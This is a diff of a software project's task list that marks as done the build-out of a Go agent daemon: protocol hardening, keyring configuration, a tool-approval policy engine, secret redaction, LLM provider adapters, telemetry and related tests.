@@ -10,17 +10,63 @@ default CI.
 
 ## Tasks
 
-### [ ] T-F1-01 · Migration 0005 (agent, models, audit, MCP)
+### [x] 2026-09-27 T-F1-32 · The handshake has a deadline and always answers
+- **What:**
+  - a 5 s deadline from accept to a completed `system.hello`, then `UNAUTHORIZED` with a null id
+    and a close;
+  - before the handshake, a JSON-RPC notification gets `UNAUTHORIZED` with a null id and a
+    close;
+  - a `system.hello` without an `id` or with a null `id` gets the same at any time, checked
+    before any token;
+  - API §1 (the JSON-RPC deviation), §2 and §8.
+- **REQ:** REQ-SEC-017, REQ-SEC-018
+- **Files:** `internal/api/conn.go`, `internal/api/server.go`, `internal/api/system.go`,
+  `internal/api/jsonrpc.go`, `internal/api/server_test.go`, `specs/api/umbral-daemon-api-v1.md`
+- **Depends on:** F0 complete. **Goes before T-F1-01.**
+- **Delta:** `changes/_archive/2026-09-handshake-hardening/`
+- **Done:** `TestASilentConnectionIsClosedAfterTheDeadline_REQ_SEC_017` and
+  `TestANotificationBeforeHelloIsUnauthorized_REQ_SEC_018` green, each seen red against its own
+  deliberate break; `task ci` green.
+
+### [x] 2026-09-27 T-F1-33 · The frame limit is enforced outbound, watched, and adjustable from the CLI
+- **What:**
+  - **Encoder:** every outbound frame is measured. A response over the limit becomes
+    `RESULT_TOO_LARGE` (`-32014`, with `size_bytes` and `limit_bytes`). A notification over it
+    becomes `limits.notification_dropped` under the same `seq`.
+  - **`block.get`:** shortens its output to fit, on a UTF-8 boundary or a base64 boundary, and
+    reports `output_response_truncated_bytes`.
+  - **Monitoring:** `frames` counters in `system.status` and `limits.get`; warn logs without
+    content.
+  - **The setting:** `[api] max_message_bytes` (1–64 MiB, default 4) is the first live key.
+    `limits.set` rewrites only that line, atomically, covering every case in the delta's
+    file-cases table. The 4 MiB limit before the handshake is
+    fixed. `max_message_bytes` is announced in `system.hello` and adopted by `internal/client`.
+  - **CLI:** `umb limits` and `umb limits set --max-message <size>`, the `frames` line in
+    `umb status`, and the hint on `RESULT_TOO_LARGE`.
+  - **Spec edits:** API §1–§9, Tech §5.1, §7.2 and §9.4.
+- **REQ:** REQ-API-005, REQ-OBS-005, REQ-CLI-007
+- **Files:** `internal/api/**`, `internal/client/**`, `internal/config/**`, `cmd/umb/**`,
+  `cmd/umbrald/**`,
+  `specs/api/umbral-daemon-api-v1.md`, `specs/technical/umbral-architecture.md`
+- **Depends on:** T-F1-32. **Goes before T-F1-01.**
+- **Delta:** `changes/_archive/2026-09-frame-limit-monitoring/` — its Verification and its
+  file-cases table are what this task's Done refers to.
+- **Done:** the four tests of the delta's Verification are green, and each was seen red against
+  its own break. `task schema` and `task ci` are green.
+
+### [x] 2026-09-27 T-F1-01 · Migration 0005 (agent, models, audit, MCP, skills)
 - **What:** Data Model tables §2.4c to §2.13 with their indexes, plus recovery §6 steps 3-4.
   `threads` (§2.5) is **not** created here: migration 0001 already created it (§5, finding A-01).
   The structure tables (§2.4b) are **not** created here either: migration 0003 owns them (T-F0-14).
   `messages` includes `client_msg_id` and its partial unique index `idx_messages_client_msg`.
+  `skills` (§2.4f, delta `2026-09-skills-cli`) is created here too, so T-F1-34 never has to edit
+  a written migration.
 - **REQ:** REQ-AGT-011, REQ-LLM-005, REQ-SEC-002
 - **Files:** `internal/store/migrations/0005_agent.sql`, `internal/store/**`
-- **Depends on:** F0 complete
+- **Depends on:** F0 complete, T-F1-32, T-F1-33 — the two protocol tasks go first
 - **Done:** `TestMigration0005Constraints` and `TestRecoveryExpiresPendingApprovals_REQ_AGT_011` green.
 
-### [ ] T-F1-02 · Keyring and configuration loader
+### [x] 2026-09-27 T-F1-02 · Keyring and configuration loader
 - **What:**
   - TOML loader with JSON Schema;
   - resolution of `keyring:<path>` with go-keyring;
@@ -32,46 +78,53 @@ default CI.
     `[secrets] allow_env = true`, reported as `degraded` with reason `env_secret` (REQ-SEC-012);
   - `config.get` and `config.reload`.
 - **REQ:** REQ-SEC-004, REQ-SEC-008, REQ-SEC-012
-- **Files:** `internal/config/**`, `internal/security/adapters/keyring/**`
+- **Files:** `internal/config/**`, `internal/security/{domain,ports}/**`,
+  `internal/security/adapters/keyring/**`, `internal/api/config*.go`, `cmd/umbrald/providers*.go`,
+  `cmd/umb/main.go`, `specs/api/umbral-daemon-api-v1.md`, `specs/technical/umbral-architecture.md`
 - **Depends on:** T-F1-01
 - **Done:** `TestPlaintextKeyRejected_REQ_SEC_004`, `TestKeyringUnavailableDisablesProviders_REQ_SEC_008` and `TestEnvFallbackOnlyWhenEnabled_REQ_SEC_012` green; with `allow_env = false` and no keyring, no provider starts with a credential.
 
-### [ ] T-F1-03 · [P] Policy engine
+### [x] 2026-09-27 T-F1-03 · [P] Policy engine
 - **What:** pure `Decide()` following DD-006 precedence and the Tech Design §5.3 table; destructive-pattern list; workspace computation; taint.
 - **REQ:** REQ-AGT-009, REQ-AGT-013, REQ-AGT-014, REQ-SEC-005, REQ-SEC-006
 - **Files:** `internal/security/domain/policy*.go`
 - **Depends on:** T-F1-01
-- **Done:** table tests `TestPolicy_*_REQ_AGT_009/013/014`, `TestDestructiveAlwaysAsk_REQ_SEC_005` and `TestTaintedRequiresAsk_REQ_SEC_006` green, with ≥ 90 % package coverage.
+- **Done:** table tests `TestAskModeReadOnlyTools_REQ_AGT_009`, `TestPolicyAutoEditWorkspace_REQ_AGT_013`, `TestPolicyNormalDefaultAsk_REQ_AGT_014` (the matrix names), `TestDestructiveAlwaysAsk_REQ_SEC_005` and `TestTaintedRequiresAsk_REQ_SEC_006` green, with ≥ 90 % package coverage.
 
-### [ ] T-F1-04 · [P] Secret redaction
+### [x] 2026-09-27 T-F1-04 · [P] Secret redaction
 - **What:** rules (AWS/GCP/GitHub/GitLab/OpenAI/Anthropic/HF keys, JWT, PEM private keys, `.env`) plus an entropy detector; replacement with `[REDACTED:<rule>]`.
 - **REQ:** REQ-SEC-001
-- **Files:** `internal/security/domain/redact*.go`, `testdata/redact/**`
+- **Files:** `internal/security/domain/redact*.go`, `internal/security/domain/testdata/redact/**`
 - **Depends on:** T-F1-01
 - **Done:** `TestRedactionCorpus_REQ_SEC_001` (corpus with ≥ 30 positives and ≥ 30 negatives) green.
 
-### [ ] T-F1-05 · Gateway: ports, catalog and openai-compat adapters
+### [x] 2026-09-27 T-F1-05 · Gateway: ports, catalog and openai-compat adapters
 - **What:**
   - `Provider` port (architecture §6) with normalized events;
   - `llamacpp`, `lmstudio`, `openrouter` and `openai-compat` adapters on top of Fantasy;
   - discovery through `/v1/models`;
-  - `model.list` with `refresh`.
-- **REQ:** REQ-LLM-001, REQ-LLM-002
-- **Files:** `internal/llmgw/{ports,catalog,adapters/openaicompat,adapters/openrouter}/**`
+  - `model.list` with `refresh`;
+  - the models of a provider T-F1-02 left `down` (no keyring, a refused `env:`, a missing
+    secret) are listed `health = down` with that provider's reason, and are never called —
+    REQ-SEC-008's second clause, which T-F1-02 could not close before the model rows existed.
+    Delta `2026-09-provider-config` decides whether the reason is read from the provider or
+    needs its own column.
+- **REQ:** REQ-LLM-001, REQ-LLM-002, REQ-SEC-008 (and, from the review, REQ-SEC-002 and REQ-LLM-004 for discovery)
+- **Files:** `internal/llmgw/{domain,ports}/**`, `internal/llmgw/catalog.go` (the module's service, like `sessions` and `workspaces`), `internal/llmgw/adapters/{fantasyconv,openaicompat,openrouter,modelstore,egresslog}/**`, `internal/api/models.go`, `cmd/umbrald/gateway.go`, `.go-arch-lint.yml`
 - **Depends on:** T-F1-02
-- **Done:** tests with a fake server `TestDiscoverModels_REQ_LLM_002` and `TestStreamNormalized_REQ_LLM_001` green.
+- **Done:** tests with a fake server `TestDiscoverModels_REQ_LLM_002` and `TestStreamNormalized_REQ_LLM_001` green; `TestModelsOfADownProviderAreDown_REQ_SEC_008` green.
 
-### [ ] T-F1-06 · Native Ollama adapter
+### [x] 2026-09-27 T-F1-06 · Native Ollama adapter
 - **What:**
   - `/api/chat` with streaming, tools, `think`, `format` and `num_ctx`;
   - `keep_alive`;
   - discovery through `/api/tags`.
 - **REQ:** REQ-LLM-001, REQ-LLM-006
-- **Files:** `internal/llmgw/adapters/ollama/**`
+- **Files:** `internal/llmgw/adapters/ollama/**`, `internal/llmgw/domain/stream.go` (`Reasoning`, `ResponseSchema`, `ToolName`), `cmd/umbrald/gateway.go`
 - **Depends on:** T-F1-05
 - **Done:** `TestOllamaSendsNumCtx_REQ_LLM_006` (fake) green; `TestOllamaLive` (tag `live`) green against `gpt-oss:20b`.
 
-### [ ] T-F1-07 · Router, fallback, usage and egress hooks
+### [x] 2026-09-27 T-F1-07 · Router, fallback, usage and egress hooks
 - **What:**
   - candidates per class and offline filter;
   - capability filter;
@@ -79,40 +132,47 @@ default CI.
   - fallback on 429, 5xx and first-token timeout (30 s remote / 120 s local);
   - recording in `usage`;
   - redaction before sending;
-  - `egress_log` for non-loopback hosts.
+  - `egress_log` for non-loopback hosts — the transport that writes it exists since T-F1-05
+    (`fantasyconv.EgressTransport`); this task marks each call's context with its thread
+    (`domain.WithThread`) and redacts before the payload is hashed;
+  - capability honesty: the openai-compat and OpenRouter adapters ignore `Request.Reasoning` and
+    `Request.ResponseSchema` since T-F1-05/06, so until they carry them the router must not pick
+    those adapters for a request that sets them, or they must refuse it with a non-retryable
+    `ProviderError`; and a request that cannot be built (Status 0 today, so retryable) must not
+    be retried on another candidate.
 - **REQ:** REQ-LLM-003, REQ-LLM-004, REQ-LLM-005, REQ-SEC-001, REQ-SEC-002
-- **Files:** `internal/llmgw/router/**`
+- **Files:** `internal/llmgw/router.go` (the router is part of `llmgw-service`, where `.go-arch-lint.yml` already placed it), `internal/llmgw/domain/usage.go`, `internal/llmgw/domain/stream.go`, `internal/llmgw/ports/provider.go`, `internal/llmgw/adapters/usagelog/**`, `internal/llmgw/adapters/fantasyconv/fantasyconv.go`, `internal/llmgw/adapters/ollama/ollama.go`, `cmd/umbrald/gateway.go`, `cmd/umbrald/main.go`; delta `changes/_archive/2026-09-router-fallback/`
 - **Depends on:** T-F1-04, T-F1-06
 - **Done:** tests `TestFallbackOn429_REQ_LLM_003`, `TestOfflineRejectsRemote_REQ_LLM_004`, `TestUsageRecorded_REQ_LLM_005` and `TestEgressLoggedForRemote_REQ_SEC_002` green.
 
-### [ ] T-F1-08 · [P] HF router and OmniRoute presets
+### [x] 2026-09-27 T-F1-08 · [P] HF router and OmniRoute presets
 - **What:** commented configuration templates (`examples/models.toml`) and validation that both go through `openai-compat`.
 - **REQ:** REQ-LLM-007
-- **Files:** `examples/models.toml`, `internal/config/presets*.go`
+- **Files:** `examples/models.toml`, `internal/config/presets*.go`, `cmd/umbrald/gateway_test.go`
 - **Depends on:** T-F1-05
 - **Done:** `TestPresetsLoad_REQ_LLM_007` green.
 
-### [ ] T-F1-09 · Tool registry and built-in tools
+### [x] 2026-09-27 T-F1-09 · Tool registry and built-in tools
 - **What:**
   - microkernel registry with JSON Schema validation;
   - tools `read_file`, `write_file`, `edit_file` (with unified diff), `grep`, `glob`, `list_dir` and `fetch_url`;
   - `fetch_url` marks taint.
-- **REQ:** REQ-AGT-002, REQ-AGT-012, REQ-AGT-018, REQ-SEC-006
-- **Files:** `internal/tools/{ports,builtin}/**`
+- **REQ:** REQ-AGT-002, REQ-AGT-012, REQ-AGT-018, REQ-SEC-006 (and, from the review, REQ-AGT-004, REQ-AGT-013, REQ-AGT-014 and REQ-SEC-002)
+- **Files:** `internal/tools/{domain,ports}/**`, `internal/tools/adapters/{registry,builtin}/**` (the built-ins are adapters, which `.go-arch-lint.yml` maps; it gains `tools-adapters` → `tools-adapters` for the registry's tests); delta `changes/_archive/2026-09-builtin-tools/`
 - **Depends on:** T-F1-03
 - **Done:** `TestToolSchemasDeclared_REQ_AGT_002`, `TestEditFileProducesDiff_REQ_AGT_012`, `TestFetchMarksTaint_REQ_SEC_006` and `TestFetchUrlRefusesPrivateRanges_REQ_AGT_018` green, including the redirect-to-loopback case.
 
-### [ ] T-F1-10 · `run_command` in the thread PTY
+### [x] 2026-09-27 T-F1-10 · `run_command` in the thread PTY
 - **What:**
   - dedicated PTY per thread (session with `owner_thread_id`), with the `agent` lock;
   - block with `origin = agent`;
   - process group so it can be terminated.
 - **REQ:** REQ-AGT-003, REQ-AGT-007
-- **Files:** `internal/tools/builtin/runcommand*.go`, `internal/sessions/**`
+- **Files:** `internal/tools/adapters/builtin/runcommand*.go`, `internal/sessions/**` (`agent.go`, the recorder's claim, the PTY's `SignalKillForeground`, the `AgentTerminal` port); delta `changes/_archive/2026-09-builtin-tools/` (decisions 6–9)
 - **Depends on:** T-F1-09
 - **Done:** `TestRunCommandCreatesAgentBlock_REQ_AGT_003` green.
 
-### [ ] T-F1-11 · [P] Context: rules, attachments and git
+### [x] 2026-09-27 T-F1-11 · [P] Context: rules, attachments and git
 - **What:**
   - rules-file lookup from the repo root down to the cwd;
   - `@file`, `@directory` and `@block:<id>` attachments with truncation at 256 KiB;
@@ -123,14 +183,14 @@ default CI.
 - **Depends on:** T-F1-01
 - **Done:** tests `…_REQ_CTX_001/002/003/005` green with fixture repos.
 
-### [ ] T-F1-12 · Token budget and compaction
-- **What:** token counting per family (Q-03), response reserve, compaction via summary with the `fast` class and the `context.compacted` notification.
+### [x] 2026-09-27 T-F1-12 · Token budget and compaction
+- **What:** token estimation (Q-03), response reserve, and compaction via a summary made by an injected summarizer (the runtime passes the `fast` class), returning the `context.compacted` payload; T-F1-13 persists the summary and publishes the notification (delta `2026-09-context-budget`, decision 8).
 - **REQ:** REQ-CTX-004
-- **Files:** `internal/context/budget/**`
+- **Files:** `internal/context/domain/budget.go` (pure: the arch rules map `internal/context` to domain, ports and adapters, and the budget needs no I/O)
 - **Depends on:** T-F1-11
 - **Done:** `TestCompactionTriggeredOverWindow_REQ_CTX_004` green.
 
-### [ ] T-F1-13 · Agent runtime and `thread.*`
+### [x] 2026-09-27 T-F1-13 · Agent runtime and `thread.*`
 - **What:**
   - per-turn loop that persists before notifying (DD-007);
   - methods `thread.create`, `send`, `get`, `list` and `update`;
@@ -141,12 +201,12 @@ default CI.
   - `thread.send` idempotency by `client_msg_id`: a repeated key returns the original
     `{turn_id, message_id}` without creating a turn and without re-running its tools, including
     while the first turn is still running (REQ-AGT-015).
-- **REQ:** REQ-AGT-001, REQ-AGT-008, REQ-AGT-009, REQ-AGT-010, REQ-AGT-011, REQ-AGT-015
+- **REQ:** REQ-AGT-001, REQ-AGT-008, REQ-AGT-009, REQ-AGT-010, REQ-AGT-011, REQ-AGT-015, REQ-CTX-004 (the call before sending, and the event)
 - **Files:** `internal/agents/**`, `internal/api/threads.go`
 - **Depends on:** T-F1-07, T-F1-10, T-F1-12
-- **Done:** tests `…_REQ_AGT_001/008/009/010/011` green with a scripted fake provider; `TestSendIdempotentByClientMsgID_REQ_AGT_015` green (two identical sends → one turn, and the tools run once).
+- **Done:** tests `…_REQ_AGT_001/008/009/010/011` green with a scripted fake provider; `TestSendIdempotentByClientMsgID_REQ_AGT_015` green (two identical sends → one turn, and the tools run once). `TestCompactedEventPersistedThenPublished_REQ_CTX_004` green (the summary is a `system_note` row before `context.compacted` is published).
 
-### [ ] T-F1-14 · Approval flow
+### [x] 2026-09-27 T-F1-14 · Approval flow
 - **What:**
   - `approval.requested` pauses the turn and `approval.respond` resumes it;
   - rule persistence (`thread` / `always`); destructive patterns ignore `always`;
@@ -157,21 +217,21 @@ default CI.
 - **Depends on:** T-F1-13
 - **Done:** `TestAskPausesTurn_REQ_AGT_004` and `TestDenyReturnsDeniedByUser_REQ_AGT_005` green.
 
-### [ ] T-F1-15 · Repair of invalid tool calls
+### [x] 2026-10-01 T-F1-15 · Repair of invalid tool calls
 - **What:** one retry with a repair message; on the second failure, `stop_reason = tool_error`; increment `umbral_tool_calls_invalid_total{model}`.
 - **REQ:** REQ-AGT-006, REQ-OBS-002
 - **Files:** `internal/agents/repair*.go`, `internal/obs/metrics.go`
 - **Depends on:** T-F1-13
 - **Done:** `TestInvalidArgsRepairOnce_REQ_AGT_006` and `TestInvalidMetricIncrements_REQ_OBS_002` green.
 
-### [ ] T-F1-16 · Cancellation
+### [x] 2026-10-01 T-F1-16 · Cancellation
 - **What:** `thread.cancel` cancels the turn's context; SIGTERM to the process group; SIGKILL after 300 ms.
 - **REQ:** REQ-AGT-007
 - **Files:** `internal/agents/cancel*.go`
 - **Depends on:** T-F1-13
 - **Done:** `TestCancelUnder500ms_REQ_AGT_007` (with `sleep 60` running) green.
 
-### [ ] T-F1-17 · MCP client
+### [x] 2026-10-01 T-F1-17 · MCP client
 - **What:**
   - stdio and streamable HTTP connections with the official SDK;
   - `mcp_<server>_<tool>` prefix;
@@ -179,125 +239,146 @@ default CI.
   - 10 s timeout and exponential backoff (at most 5 attempts);
   - `ask` policy by default.
 - **REQ:** REQ-MCP-001, REQ-MCP-002, REQ-MCP-003, REQ-MCP-004
-- **Files:** `internal/mcp/client/**`, `internal/tools/mcptools/**`
+- **Files:** `internal/mcp/**` (domain, ports, the `Manager`, `adapters/serverstore`, `adapters/sdk`), `internal/tools/adapters/mcptools/**`, `internal/api/mcp.go`, `cmd/umbrald/mcp.go` (the hexagonal split of every other module, instead of the `internal/mcp/client/**` and `internal/tools/mcptools/**` first written here)
 - **Depends on:** T-F1-09
 - **Done:** tests with a test MCP server written in Go `…_REQ_MCP_001/002/003/004` green.
 
-### [ ] T-F1-18 · OTel observability
+### [x] 2026-10-03 T-F1-18 · OTel observability
 - **What:**
   - root span `agent.turn` with children `llm.call` and `tool.*`, with GenAI attributes;
   - `trace_id` in `slog` logs;
-  - optional OTLP exporter.
-- **REQ:** REQ-OBS-001, REQ-OBS-003, REQ-OBS-004
-- **Files:** `internal/obs/**`
+  - optional OTLP exporter;
+  - `umbral_tool_calls_invalid_total{model}` exported from `obs.Metrics`.
+- **REQ:** REQ-OBS-001, REQ-OBS-002 (the export; T-F1-15 counts it, delta `2026-10-tool-call-repair`), REQ-OBS-003, REQ-OBS-004
+- **Files:** `internal/obs/**`, `agents/ports.Tracer`, `llmgw/ports.Tracer`, `waits.Service.Active`, `config.Settings.OTelEndpoint`, `api.Server.Frames`, `internal/api/config.go`, `cmd/umbrald/telemetry.go` (delta `2026-10-otel`)
 - **Depends on:** T-F1-13
-- **Done:** `TestTurnTraceHasSpans_REQ_OBS_001` (in-memory exporter) and `TestOrchestrationMetricsExposed_REQ_OBS_004` green.
+- **Done:**
+  - `TestTurnTraceHasSpans_REQ_OBS_001` is green: a real daemon exporting to an OTLP collector on loopback;
+  - the in-memory exporter tests in `internal/obs` are green;
+  - `TestInvalidCallsExported_REQ_OBS_002`, `TestTracesExportThroughOTLP_REQ_OBS_003` and `TestOrchestrationMetricsExposed_REQ_OBS_004` are green.
 
-### [ ] T-F1-19 · `umb ai` with stdin
+### [x] 2026-10-04 T-F1-19 · `umb ai` with stdin
 - **What:** ephemeral thread in `ask` mode; stdin as an attachment (at most 1 MiB, truncation noted); streaming to stdout; non-zero exit code if the turn ends in error.
 - **REQ:** REQ-CLI-001
-- **Files:** `cmd/umb/ai.go`
+- **Note (delta `2026-10-wait-engine`, decision 12):** `umb` gets no wait command of its own; `umb ai` is the CLI's consumer of `thread.send`'s `wait`, which §2's `cli` row allows.
+- **Note (delta `2026-10-umb-ai`):** stdin crosses as an inline `stdin` attachment (API §5.20),
+  cut to fit the connection's frame limit; the wait's targets are `done`, `stopped` and `blocked`.
+- **Files:** `cmd/umb/ai.go`, `internal/api/threads.go`, `internal/agents/runtime.go`,
+  `internal/context/domain/attachment.go`
 - **Depends on:** T-F1-13
 - **Done:** `TestUmbAiPipesStdin_REQ_CLI_001` green.
 
-### [ ] T-F1-20 · TUI: agent panel
+### [x] 2026-10-18 T-F1-20 · TUI: agent panel
 - **What:**
   - thread panel with deltas;
   - toggle input between shell and agent with `ctrl+space`;
-  - approval queue with `[a]pprove`, `[d]eny` and `a[l]ways`, plus a diff view;
+  - approval queue, every thread's, answered with ctrl+y (once), ctrl+r (thread), ctrl+l (always)
+    and ctrl+x (deny), plus a diff view (ctrl+e) — Tech §5.3e, delta `2026-10-agent-panel`;
   - "attach to agent" action on a block.
 - **REQ:** REQ-TUI-001, REQ-TUI-002, REQ-TUI-003
-- **Files:** `internal/tui/agent/**`
+- **Files:** `internal/tui/agent.go`, `internal/tui/ports/ports.go`, `internal/tui/adapters/daemon/daemon.go`
 - **Depends on:** T-F1-14
-- **Done:** teatest tests `…_REQ_TUI_002/003` green; `docs/qa/f1-tui.md` completed.
+- **Done:** the model's harness tests `…_REQ_TUI_001/002/003` green; `docs/qa/f1-tui.md` completed.
+- **Note (delta `2026-10-f1-close`):** merged 2026-10-03; the harness tests are green. The walk of
+  `docs/qa/f1-tui.md` moved to the Hardening phase as `T-REL-02`, a release 0.1 gate, when F1
+  closed on 2026-10-22.
 
-### [ ] T-F1-21 · Live US-003 E2E
+### [x] 2026-10-04 T-F1-21 · Live US-003 E2E
 - **What:**
   - Go fixture repo with a broken test;
   - script that runs 20 times: create an `auto-edit` thread, attach the failed block, "fix it", auto-approve `run_command go test`, with `router.offline = true`;
   - report with success rate, invalid tool call rate and latency.
-- **REQ:** REQ-AGT-001, REQ-LLM-004, REQ-SEC-002 (PRD §4.1 goal)
-- **Files:** `e2e/us003/**`, `docs/reports/us003-<date>.md`
+- **REQ:** REQ-AGT-001, REQ-LLM-004, REQ-SEC-002 (PRD §4.1 goal), REQ-AGT-006
+- **Note (delta `2026-10-us003-e2e`):** the driver is `cmd/umbrald/us003_live_test.go`, which reuses the real-daemon isolation; the approval and success rules and the offline evidence are Tech §8's. The run found the repair message printing the validator's Go value, now its text.
+- **Files:** `e2e/us003/**`, `cmd/umbrald/us003_live_test.go`, `.go-arch-lint.yml`, `internal/tools/adapters/registry/registry.go`, `docs/reports/us003-2026-10-04*.md`
 - **Depends on:** T-F1-20
 - **Done:** report with ≥ 14/20 successes and 0 rows in `egress_log` during the run.
 
-### [ ] T-F1-22 · Hardening
+### [x] 2026-10-04 T-F1-22 · Hardening
 - **What:** retention job (Data Model §4), E2E verification of recovery after `kill -9` of the daemon, user guide for provider configuration.
 - **REQ:** REQ-AGT-011, Art. 6
-- **Files:** `internal/store/retention*.go`, `docs/user/*.md`
+- **Note (delta `2026-10-retention`):** `[retention]` sets the windows; the job runs at start and daily in 500-row batches; ephemeral threads take their agent blocks (REQ-TERM-005's exception); the crash test SIGKILLs during an approval wait and mid-stream.
+- **Files:** `internal/store/retention*.go`, `internal/config/settings.go`, `cmd/umbrald/retention.go`, `cmd/umbrald/crash_test.go`, `docs/user/*.md`
 - **Depends on:** T-F1-21
 - **Done:** `TestRetentionPurgesRawChunks` and `TestCrashRecovery_REQ_AGT_011` green.
 
-### [ ] T-F1-23 · Wait engine
+### [x] 2026-10-03 T-F1-23 · Wait engine
 - **What:**
   - `thread.wait` owned by the server and driven by events, pinning the current turn;
   - `wait` object inside `thread.send` as one ordered submission;
   - `block.wait_output` with RE2 over recent output;
   - typed `TIMEOUT` carrying the last observed state.
+- **Note (delta `2026-10-thread-cancel`, decision 7):** a pinned turn can end `stopped` (a
+  cancel); §5.29 must say what a wait whose targets do not include `stopped` does then.
 - **REQ:** REQ-AUT-001, REQ-AUT-002, REQ-AUT-003, REQ-AUT-004
-- **Files:** `internal/agents/wait/**`, `internal/api/waits.go`, `cmd/umb/wait.go`
+- **Files:** `internal/waits/**`, `internal/api/waits.go`, `cmd/umbrald/waits.go` (delta `2026-10-wait-engine`, decisions 10 and 12)
 - **Depends on:** T-F1-13
 - **Done:** tests `TestWaitPinsTurn_REQ_AUT_001`, `TestSendWaitRejectsBlocked_REQ_AUT_002`, `TestWaitOutputMatchesLine_REQ_AUT_003` and `TestWaitTimeoutReportsLastState_REQ_AUT_004` green.
 
-### [ ] T-F1-24 · Attention state and thread resume
-- **What:** `attention_state` and `seen_at` on threads; `done` until a client focuses it; `thread.attention_changed` notification; restore threads after a restart with their history and `stopped` turns. The two columns are added by the `ALTER TABLE` statements of Data Model §2.5 inside migration **0005**, because 0001 created `threads` and is already applied (Art. 6). It was 0004 until delta `2026-09-restore-semantics` gave that number to the restore migration.
+### [x] 2026-10-17 T-F1-24 · Attention state and thread resume
+- **What:** writing `attention_state` and `seen_at` on threads; `done` until a client focuses it; `thread.attention_changed` notification; restore threads after a restart with their history and `stopped` turns. The two columns already exist: T-F1-01 added them with the `ALTER TABLE` statements of Data Model §2.5 in migration **0005**, which is applied and is not edited again (Art. 6). This task writes to them; enforcing `attention_state`'s values is the writer's job, since SQLite cannot add a `CHECK` in an `ALTER`.
 - **REQ:** REQ-AGT-016, REQ-AGT-017
-- **Files:** `internal/agents/attention*.go`, `internal/store/migrations/0005_agent.sql`, `internal/store/**`
+- **Files:** `internal/agents/attention*.go`, `internal/agents/{runtime,turn,approvals}.go`, `internal/agents/adapters/threadstore/**`, `internal/api/{threads,conn,notify,snapshot}.go`, `internal/waits/waits.go`, `internal/tui/**` (delta `2026-10-attention-focus`; nothing in `internal/store`, and not `0005_agent.sql`, which T-F1-01 wrote)
 - **Depends on:** T-F1-13
 - **Done:** `TestDoneUntilFocused_REQ_AGT_016` and `TestThreadsResumeAfterRestart_REQ_AGT_017` green.
 
-### [ ] T-F1-25 · Integration surface
+### [x] 2026-10-17 T-F1-25 · Integration surface
 - **What:**
   - injection of `UMBRAL_*` variables with Umbral's values winning;
   - `pane.report_state` and `pane.release_state` with `source` and `seq`;
   - the rule that Umbral's own agent owns the panes of its threads.
 - **REQ:** REQ-INT-001, REQ-INT-002, REQ-INT-003, REQ-INT-005, REQ-INT-006
-- **Files:** `internal/integrations/**`, `internal/api/panes.go`, `cmd/umb/pane.go`
+- **Files:** `internal/integrations/**`, `internal/api/panes.go`, `cmd/umb/pane.go`, `cmd/umbrald/integrations.go`, `internal/workspaces/{domain/attention.go,adapters/treestore,service.go,restore.go}`, `internal/sessions/{lifecycle,service}.go`, `.go-arch-lint.yml` (delta `2026-10-integration-surface`)
 - **Depends on:** T-F1-13
 - **Done:** tests `TestEnvInjectedAndAuthoritative_REQ_INT_001`, `TestExternalReportDrivesRollup_REQ_INT_002`, `TestStaleSeqIgnored_REQ_INT_003` and `TestReleaseRestoresOwnDetection_REQ_INT_005` and `TestOwnAgentCannotBeDisplaced_REQ_INT_006` green.
 
-### [ ] T-F1-26 · Display metadata and tokens
+### [x] 2026-10-18 T-F1-26 · Display metadata and tokens
 - **What:** `pane.report_metadata` with normalization, 80-character cap, TTL, 16 keys per report and 32 per pane; strict separation from semantic state.
+- **Note (delta `2026-10-display-metadata`, decision 9):** there is no `umb pane report_metadata` yet; it can ride with T-F1-37 or a small task of its own when a hook needs it.
 - **REQ:** REQ-INT-004
-- **Files:** `internal/integrations/metadata*.go`
+- **Files:** `internal/integrations/{metadata.go,domain/metadata.go,adapters/reportstore/metadata.go,ports,integrations.go}`, `internal/workspaces/{domain/metadata.go,domain/tree.go,adapters/treestore/panes.go}`, `internal/api/{panes,workspaces}.go`, `internal/store/retention.go`, `cmd/umbrald/integrations.go`, `.go-arch-lint.yml` (delta `2026-10-display-metadata`)
 - **Depends on:** T-F1-25
 - **Done:** `TestMetadataNeverChangesWaits_REQ_INT_004` green, including the limit and expiry cases.
 
-### [ ] T-F1-27 · Notifications
+### [x] 2026-10-18 T-F1-27 · Notifications
 - **What:** `notification.show` with normalization, delivery to the foreground client, typed reasons and a rate limit of 5 per source per 60 s.
+- **Note (delta `2026-10-integration-surface`, decision 15):** an external `pane.report_state` of `blocked` raises a user notification through the same normalization and rate limit as any source (REQ-NTF-002); `done`, `working` and `idle` do not. The integration surface publishes `pane.state_changed`; this task is what turns a `blocked` into a notification.
 - **REQ:** REQ-NTF-001, REQ-NTF-002
-- **Files:** `internal/notify/**`, `internal/api/notifications.go`
+- **Files:** `internal/notify/**`, `internal/api/notifications.go`; widened by delta `2026-10-notifications` to `internal/api` (`conn.go`, `system.go`, `server.go`, `errors.go`, `schema.go`), `internal/integrations` (the `Notifier` port), `internal/config`, `cmd/umbrald`, `cmd/umb/notify.go`, `internal/tui` (the status line), `docs/qa/f1-tui.md` (step 13) and `.go-arch-lint.yml`
 - **Depends on:** T-F1-24
 - **Done:** `TestNotificationNormalizesAndReports_REQ_NTF_001` and `TestNotificationRateLimited_REQ_NTF_002` green.
 
-### [ ] T-F1-28 · Policy explain
-- **What:** `policy.explain` returning the decision and the ordered trace of DD-006, read-only; `umb policy explain` on the CLI.
+### [x] 2026-10-18 T-F1-28 · Policy explain
+- **What:** `policy.explain` returning the decision and the ordered trace of DD-006, read-only; `umb policy explain` on the CLI. The trace is `Decision.Trace` of T-F1-03: the `exposure` step plus DD-006's six, every one evaluated, one marked `decided` (delta `2026-09-policy-precedence`, decision 5 — the API §5.36 example is updated here).
 - **REQ:** REQ-SEC-009
-- **Files:** `internal/security/explain*.go`, `cmd/umb/policy.go`
+- **Files:** `internal/security/explain*.go`, `cmd/umb/policy.go`; widened by delta `2026-10-policy-explain` to `internal/security/{domain,ports}/explain.go`, `internal/api/policy.go`, `cmd/umbrald/policy.go`, `internal/tools/adapters/builtin/builtin.go` (`PolicyPath`) and `.go-arch-lint.yml`
 - **Depends on:** T-F1-03
 - **Done:** `TestExplainNamesDecidingRule_REQ_SEC_009` green with one case per precedence step.
 
-### [ ] T-F1-29 · Rule overrides and optional updates
+### [x] 2026-10-18 T-F1-29 · Rule overrides and optional updates
 - **What:** load redaction rules and destructive patterns from `$XDG_CONFIG_HOME/umbral/rules/`; precedence over the built-in ones; invalid files ignored with a warning; optional remote fetch disabled by default and logged in `egress_log`.
